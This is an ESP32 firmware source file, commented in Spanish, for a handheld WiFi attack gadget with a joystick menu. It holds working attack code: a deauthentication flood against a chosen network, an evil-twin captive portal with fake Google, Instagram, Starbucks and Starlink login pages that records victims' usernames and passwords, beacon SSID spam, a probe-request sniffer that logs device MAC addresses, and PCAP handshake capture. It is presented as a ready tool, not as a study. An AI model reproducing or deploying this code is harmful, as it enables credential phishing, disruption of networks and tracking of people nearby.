#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h> 
#include <esp_wifi.h> 
#include <SD.h>      // Añadido para el Wardriving
#include <FS.h>      // Añadido para el Wardriving
#include "wifi_module.h"
#include "interface.h"
#include "joystick_module.h"
#include "sd_module.h"

WebServer servidorHoneypot(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

extern U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2;

// --- VARIABLES GLOBALES ---
String ultimaMacSniffed = "Ninguna";
String ultimoSSIDBuscado = "---";
int paquetesCapturados = 0;

// --- VARIABLES WARDRIVING (PCAP) ---
File pcapFile;
unsigned long paquetesWardriving = 0;
bool capturandoPCAP = false;

// --- DECLARACIONES ADELANTADAS ---
void ssidSpamReal();
void probeSnifferReal();
void menuEvilTwin(bool &dentroDeOpcion);
void menuDeauth(bool &dentroDeOpcion); 
void menuWardriving(bool &dentroDeOpcion); // NUEVO: WARDRIVING
void startHoneypot(int plantilla);
void flujoServidorDatos(bool &dentroDeOpcion);
void scanNetworks();
String generarHTML(int plantilla); 

void setupWiFi() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    Serial.println("Modulo WiFi listo");
}

void flujoWiFi(bool &dentroDeOpcion) {
    bool enMenuWiFi = true;
    int subIndice = 0;
    const int SUB_ITEMS = 7; // Aumentado para el Wardriving
    String subMenu[SUB_ITEMS] = {
        "1. Escanear Redes", 
        "2. Evil Twin(Portal)", 
        "3. Ataque Deauth", 
        "4. SSID Spam(Real)", 
        "5. Probe Sniffer", 
        "6. Wardriving (PCAP)", // NUEVA OPCIÓN
        "7. Salir"
    };

    while (enMenuWiFi) {
        dibujarPantalla(subIndice, false, subMenu, SUB_ITEMS);

        int valorY = analogRead(35);
        if (valorY < 1000) { if (subIndice > 0) subIndice--; delay(150); }
        if (valorY > 3000) { if (subIndice < SUB_ITEMS - 1) subIndice++; delay(150); }

        if (digitalRead(32) == LOW) {
            delay(200); 
            if (subIndice == 0) scanNetworks();
            else if (subIndice == 1) {
                bool enEvilTwin = true;
                menuEvilTwin(enEvilTwin);
            } 
            else if (subIndice == 2) {
                bool enDeauth = true;
                menuDeauth(enDeauth); 
            }
            else if (subIndice == 3) ssidSpamReal();
            else if (subIndice == 4) probeSnifferReal();
            else if (subIndice == 5) {
                bool enWardriving = true;
                menuWardriving(enWardriving); // Llamada al sniffer PCAP
            }
            else if (subIndice == 6) enMenuWiFi = false; 
        }
    }
    dentroDeOpcion = false;
}

// ========================================================
// NUEVO: WARDRIVING Y CAPTURA DE HANDSHAKES (.PCAP)
// ========================================================

// Callback ultrarrápido: Escucha el aire y escribe en la SD en milisegundos
void wardrivingCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!capturandoPCAP || !pcapFile) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    uint32_t caplen = (len > 256) ? 256 : len; // Cortamos a 256 bytes para no saturar la SD

    // Cabecera individual del paquete PCAP (16 bytes)
    uint32_t ts_sec = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    
    uint8_t packetHeader[16];
    memcpy(packetHeader, &ts_sec, 4);
    memcpy(packetHeader + 4, &ts_usec, 4);
    memcpy(packetHeader + 8, &caplen, 4);
    memcpy(packetHeader + 12, &len, 4);

    // Escribir cabecera y carga útil en la SD
    pcapFile.write(packetHeader, 16);
    pcapFile.write(pkt->payload, caplen);
    paquetesWardriving++;
}

void menuWardriving(bool &dentroDeOpcion) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(0, 20, "Iniciando SD...");
    u8g2.sendBuffer();

    // 1. Abrir archivo en la SD
    pcapFile = SD.open("/WIFI/captura.pcap", FILE_WRITE);
    if (!pcapFile) {
        u8g2.clearBuffer();
        u8g2.drawStr(0, 30, "ERROR DE SD");
        u8g2.drawStr(0, 45, "Revisa la memoria!");
        u8g2.sendBuffer();
        delay(2000);
        dentroDeOpcion = false;
        return;
    }

    // 2. Inyectar Cabecera Global PCAP (24 bytes) - Magia para Wireshark
    uint32_t magic = 0xa1b2c3d4;
    uint16_t v_maj = 2, v_min = 4;
    int32_t tz = 0;
    uint32_t sig = 0;
    uint32_t snap = 65535;
    uint32_t net = 105; // 802.11
    
    pcapFile.write((uint8_t*)&magic, 4); pcapFile.write((uint8_t*)&v_maj, 2);
    pcapFile.write((uint8_t*)&v_min, 2); pcapFile.write((uint8_t*)&tz, 4);
    pcapFile.write((uint8_t*)&sig, 4);   pcapFile.write((uint8_t*)&snap, 4);
    pcapFile.write((uint8_t*)&net, 4);

    // 3. Poner la tarjeta en Modo Fantasma
    paquetesWardriving = 0;
    capturandoPCAP = true;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wardrivingCallback);

    uint8_t canal = 1;
    unsigned long tCanal = millis();
    unsigned long tPantalla = millis();

    // 4. Bucle principal de cacería
    while (true) {
        // Brincar de canal cada 300 milisegundos
        if (millis() - tCanal > 300) {
            canal = (canal % 11) + 1;
            esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
            tCanal = millis();
        }

        // Actualizar pantalla cada segundo (para no trabar el sniffer)
        if (millis() - tPantalla > 1000) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x12_tr);
            u8g2.drawStr(0, 10, "== WARDRIVING ==");
            u8g2.setCursor(0, 25); u8g2.printf("Saltando Canal: %d", canal);
            u8g2.setCursor(0, 40); u8g2.printf("Guardados: %lu", paquetesWardriving);
            
            if (pcapFile) {
                u8g2.setCursor(0, 55); 
                u8g2.printf("Peso: %lu KB", pcapFile.size() / 1024);
            }
            
            u8g2.drawStr(70, 63, "Click=Salir");
            u8g2.sendBuffer();
            tPantalla = millis();
        }

        // Botón de emergencia para salir y guardar
        if (digitalRead(32) == LOW) {
            delay(300);
            break;
        }
        yield();
    }

    // 5. Limpieza y guardado seguro
    esp_wifi_set_promiscuous(false);
    capturandoPCAP = false;
    if (pcapFile) pcapFile.close();

    u8g2.clearBuffer();
    u8g2.drawStr(0, 30, "Archivo PCAP");
    u8g2.drawStr(0, 45, "Guardado en SD!");
    u8g2.sendBuffer();
    delay(2000);
    dentroDeOpcion = false;
}

// ========================================================
// MENÚ Y ATAQUE DE DESAUTENTICACIÓN (DEAUTH)
// ========================================================
void menuDeauth(bool &dentroDeOpcion) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 20, "Buscando Objetivos...");
    u8g2.sendBuffer();

    int n = WiFi.scanNetworks();
    if (n == 0) {
        u8g2.clearBuffer();
        u8g2.drawStr(0, 20, "No hay redes cerca");
        u8g2.sendBuffer();
        delay(2000);
        dentroDeOpcion = false;
        return;
    }

    bool seleccionando = true;
    int targetIndex = 0;
    
    while (seleccionando) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x12_tr);
        u8g2.drawStr(0, 10, "-- ELIGE OBJETIVO --");
        u8g2.drawLine(0, 12, 128, 12);
        
        int maxVisibles = 4;
        int startIdx = (targetIndex >= maxVisibles) ? targetIndex - maxVisibles + 1 : 0;
        
        for (int i = 0; i < maxVisibles; i++) {
            int actual = startIdx + i;
            if (actual >= n) break;
            
            int yPos = 25 + (i * 12);
            if (actual == targetIndex) u8g2.drawStr(0, yPos, ">");
            
            u8g2.setCursor(10, yPos);
            String ssid = WiFi.SSID(actual);
            if(ssid.length() > 18) ssid = ssid.substring(0, 18); 
            u8g2.print(ssid);
        }
        u8g2.sendBuffer();

        int valorY = analogRead(35);
        if (valorY < 1000) { if (targetIndex > 0) targetIndex--; delay(150); }
        if (valorY > 3000) { if (targetIndex < n - 1) targetIndex++; delay(150); }

        if (digitalRead(32) == LOW) {
            delay(200);
            seleccionando = false;
        }
    }

    String targetSSID = WiFi.SSID(targetIndex);
    uint8_t* bssid = WiFi.BSSID(targetIndex);
    int32_t canal = WiFi.channel(targetIndex);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthFrame[26] = {
        0xC0, 0x00, 
        0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
        0x00, 0x00, 
        0x07, 0x00  
    };

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(0, 15, "== INYECTANDO ==");
    u8g2.setCursor(0, 30); u8g2.print("Obj: " + targetSSID);
    u8g2.setCursor(0, 45); u8g2.print("Canal: " + String(canal));
    u8g2.drawStr(0, 60, "Click = DETENER");
    u8g2.sendBuffer();

    bool atacando = true;
    while (atacando) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
        delay(10); 

        if (digitalRead(32) == LOW) {
            delay(200);
            atacando = false;
        }
        yield();
    }
    dentroDeOpcion = false;
}

// ========================================================
// SUBMENU DE PLANTILLAS HONEYPOT
// ========================================================
void menuEvilTwin(bool &dentroDeOpcion) {
    bool enMenuET = true;
    int subIndiceET = 0;
    const int SUB_ITEMS_ET = 5; 
    String subMenuET[SUB_ITEMS_ET] = {
        "1. Google Auth", 
        "2. Instagram Log", 
        "3. Starbucks Gen",
        "4. Starlink", 
        "5. Regresar"
    };

    while (enMenuET) {
        dibujarPantalla(subIndiceET, false, subMenuET, SUB_ITEMS_ET);

        int valorY = analogRead(35);
        if (valorY < 1000) { if (subIndiceET > 0) subIndiceET--; delay(150); }
        if (valorY > 3000) { if (subIndiceET < SUB_ITEMS_ET - 1) subIndiceET++; delay(150); }

        if (digitalRead(32) == LOW) {
            delay(200); 
            if (subIndiceET == 4) { 
                enMenuET = false; 
            } else {
                startHoneypot(subIndiceET);
                bool enHoneypot = true;
                while(enHoneypot) flujoServidorDatos(enHoneypot);
            }
        }
    }
}

// ========================================================
// GENERADOR DE CÓDIGO HTML 
// ========================================================
String generarHTML(int plantilla) {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    html += "<title>Portal de Acceso</title>";
    
    if (plantilla == 3) {
        html += "<style>body{font-family: Arial, sans-serif; text-align: center; background: #000; color: #fff; padding: 20px;} ";
        html += ".box{background: #111; border: 1px solid #333; padding: 30px; border-radius: 8px; max-width: 350px; margin: auto;} ";
        html += "input{width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #555; color: white; border-radius: 5px; box-sizing: border-box;} ";
        html += "button{width: 100%; padding: 12px; border: none; border-radius: 20px; font-weight: bold; margin-top: 15px; cursor: pointer; background: #fff; color: #000;}</style></head><body>";
    } else {
        html += "<style>body{font-family: sans-serif; text-align: center; background: #fafafa; padding: 20px;} ";
        html += ".box{background: white; border: 1px solid #dbdbdb; padding: 20px; border-radius: 3px; max-width: 350px; margin: auto;} ";
        html += "input{width: 100%; padding: 10px; margin: 5px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box;} ";
        html += "button{width: 100%; padding: 10px; border: none; border-radius: 5px; color: white; font-weight: bold; margin-top: 10px; cursor: pointer;}";
        html += ".g-btn{background: #4285F4;} .i-btn{background: linear-gradient(45deg, #f09433, #bc1888);}</style></head><body>";
    }

    html += "<div class='box'>";
    if (plantilla == 0) {
        html += "<h1>Google</h1><p>Accede para navegar</p><form action='/log' method='POST'><input type='email' name='u' placeholder='Correo' required><input type='password' name='p' placeholder='Clave' required><button type='submit' class='g-btn'>Siguiente</button></form>";
    } else if (plantilla == 1) {
        html += "<h1 style='font-style: italic;'>Instagram</h1><p>Inicia sesion</p><form action='/log' method='POST'><input type='text' name='u' placeholder='Usuario' required><input type='password' name='p' placeholder='Password' required><button type='submit' class='i-btn'>Entrar</button></form>";
    } else if (plantilla == 2) {
        html += "<h2>Starbucks</h2><p>Wi-Fi Gratis</p><form action='/log' method='POST'><input type='email' name='u' placeholder='Correo' required><input type='password' name='p' placeholder='Clave' required><button type='submit' style='background:#00704A;'>Conectar</button></form>";
    } else if (plantilla == 3) {
        html += "<h1 style='letter-spacing: 4px;'>STARLINK</h1><p style='color:#aaa;'>Administracion Router</p><form action='/log' method='POST'><input type='text' name='u' placeholder='Correo' required><input type='password' name='p' placeholder='Password' required><button type='submit'>INICIAR SESION</button></form>";
    }
    html += "</div></body></html>";
    return html;
}

// ========================================================
// HONEYPOT Y PORTAL CAUTIVO 
// ========================================================
void startHoneypot(int plantilla) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 15, "Iniciando AP...");
    u8g2.sendBuffer();

    const char* ssids[] = {"Google_Free_WiFi", "Instagram_Free_Hotspot", "Starbucks_WiFi", "STARLINK"};

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(IPAddress(192, 168, 1, 1), IPAddress(192, 168, 1, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssids[plantilla]);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 1, 1));

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(0, 15, "Evil Twin Activo");
    u8g2.drawStr(0, 30, ssids[plantilla]);
    u8g2.drawStr(0, 45, "Portal Cautivo: OK");
    u8g2.drawStr(0, 60, "Click = APAGAR");
    u8g2.sendBuffer();

    servidorHoneypot.on("/", [plantilla]() {
        servidorHoneypot.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
        servidorHoneypot.send(200, "text/html", generarHTML(plantilla));
    });

    servidorHoneypot.on("/generate_204", []() {
        servidorHoneypot.sendHeader("Location", "http://192.168.1.1/", true);
        servidorHoneypot.send(302, "text/plain", "");
    });
    servidorHoneypot.on("/ncsi.txt", []() {
        servidorHoneypot.sendHeader("Location", "http://192.168.1.1/", true);
        servidorHoneypot.send(302, "text/plain", "");
    });
    servidorHoneypot.on("/hotspot-detect.html", []() {
        servidorHoneypot.sendHeader("Location", "http://192.168.1.1/", true);
        servidorHoneypot.send(302, "text/plain", "");
    });

    servidorHoneypot.on("/log", []() {
        if (servidorHoneypot.hasArg("u") && servidorHoneypot.hasArg("p")) {
            guardarCredencialesWiFi("User: " + servidorHoneypot.arg("u") + " | Pass: " + servidorHoneypot.arg("p"));
        }
        servidorHoneypot.send(200, "text/html", "<html><body style='text-align:center;padding:50px;'><h3>Gracias.</h3><p>Conexion establecida.</p></body></html>");
    });

    servidorHoneypot.onNotFound([plantilla]() {
        servidorHoneypot.sendHeader("Location", "http://192.168.1.1/", true);
        servidorHoneypot.send(302, "text/plain", "");
    });

    servidorHoneypot.begin();
}

void flujoServidorDatos(bool &dentroDeOpcion) {
    dnsServer.processNextRequest();
    servidorHoneypot.handleClient();
    
    if (digitalRead(32) == LOW) {
        delay(200);
        dnsServer.stop();
        servidorHoneypot.stop();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        dentroDeOpcion = false; 
    }
    delay(2);
}

// ========================================================
// FUNCIONES DE ESCANEO Y ATAQUE WIFI
// ========================================================
void scanNetworks() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(10, 30, "Escaneando aire...");
    u8g2.sendBuffer();

    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        u8g2.clearBuffer();
        u8g2.drawStr(10, 30, "0 redes :(");
        u8g2.sendBuffer();
        delay(2000);
    } else {
        int indiceRed = 0;
        bool viendoRedes = true;
        
        while(viendoRedes) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x12_tr);
            u8g2.setCursor(0, 10);
            u8g2.print("Redes: "); u8g2.print(n);

            // Mostramos un máximo de 3 redes simultáneas en la pantalla OLED
            for(int i = 0; i < 3; i++) {
                int index = indiceRed + i;
                if(index < n) {
                    int yPos = 30 + (i * 12);
                    // Flecha indicadora en el primer elemento visible
                    if (i == 0) u8g2.drawStr(0, yPos, ">"); 
                    
                    u8g2.setCursor(10, yPos);
                    String ssid = WiFi.SSID(index);
                    // Recortamos el nombre si es muy largo para que no se salga de la pantalla
                    if(ssid.length() > 12) ssid = ssid.substring(0, 12) + "..";
                    
                    u8g2.print(ssid);
                    u8g2.print(" (");
                    u8g2.print(WiFi.RSSI(index)); // Fuerza de la señal
                    u8g2.print(")");
                }
            }
            u8g2.sendBuffer();

            // Lógica del joystick para bajar y subir en la lista de redes
            int valorY = analogRead(35);
            if (valorY < 1000) { if (indiceRed > 0) indiceRed--; delay(150); }
            if (valorY > 3000) { if (indiceRed < n - 1) indiceRed++; delay(150); }

            // Salir del escáner con el click
            if (digitalRead(32) == LOW) {
                delay(200);
                viendoRedes = false;
            }
        }
    }
    // Liberar la memoria RAM del escaneo
    WiFi.scanDelete();
}

uint8_t beacon_frame[109] = {
    0x80, 0x00, 0x00, 0x00, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0xc0, 0x6c, 
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
    0x64, 0x00, 0x01, 0x04, 0x00, 0x00, 
};

void ssidSpamReal() {
    const char *ssids[] = {"ERROR_404_NET", "Free_WiFi_Hotspot", "Hackeado_ESP32"};
    int num_ssids = 3;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_ncenB08_tr); u8g2.drawStr(0, 15, "Spamming SSIDs..."); u8g2.sendBuffer();

    bool atacando = true; uint8_t canal = 1;
    while (atacando) {
        for (int i = 0; i < num_ssids; i++) {
            esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
            beacon_frame[10] = beacon_frame[16] = random(256);
            int ssid_len = strlen(ssids[i]);
            beacon_frame[37] = ssid_len;
            for (int j = 0; j < ssid_len; j++) beacon_frame[38 + j] = ssids[i][j];
            esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, 38 + ssid_len, true);
        }
        canal++; if (canal > 11) canal = 1;
        if (digitalRead(32) == LOW) { delay(200); atacando = false; }
        yield(); 
    }
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *payload = pkt->payload;
    if (payload[0] == 0x40) {
        paquetesCapturados++;
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", payload[10], payload[11], payload[12], payload[13], payload[14], payload[15]);
        ultimaMacSniffed = String(macStr);
        int ssid_len = payload[25];
        if (ssid_len > 0 && ssid_len <= 32) {
            char ssidStr[33]; memcpy(ssidStr, &payload[26], ssid_len); ssidStr[ssid_len] = '\0';
            ultimoSSIDBuscado = String(ssidStr);
        }
    }
}

void probeSnifferReal() {
    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_ncenB08_tr); u8g2.drawStr(0, 20, "SNIFFER ACTIVO"); u8g2.sendBuffer();
    WiFi.mode(WIFI_STA); WiFi.disconnect();
    esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
    bool escuchando = true; uint8_t canal = 1; unsigned long uCanal = millis(); unsigned long uPantalla = millis();

    while (escuchando) {
        if (millis() - uCanal > 500) { canal = (canal % 11) + 1; esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE); uCanal = millis(); }
        if (millis() - uPantalla > 1000) {
            u8g2.clearBuffer(); u8g2.setFont(u8g2_font_6x12_tr);
            u8g2.setCursor(0, 10); u8g2.print("Pkts: " + String(paquetesCapturados));
            u8g2.setCursor(0, 35); u8g2.print(ultimaMacSniffed);
            u8g2.setCursor(0, 60); u8g2.print(ultimoSSIDBuscado);
            u8g2.sendBuffer(); uPantalla = millis();
        }
        if (digitalRead(32) == LOW) { delay(200); escuchando = false; }
        yield();
    }
    esp_wifi_set_promiscuous(false);
}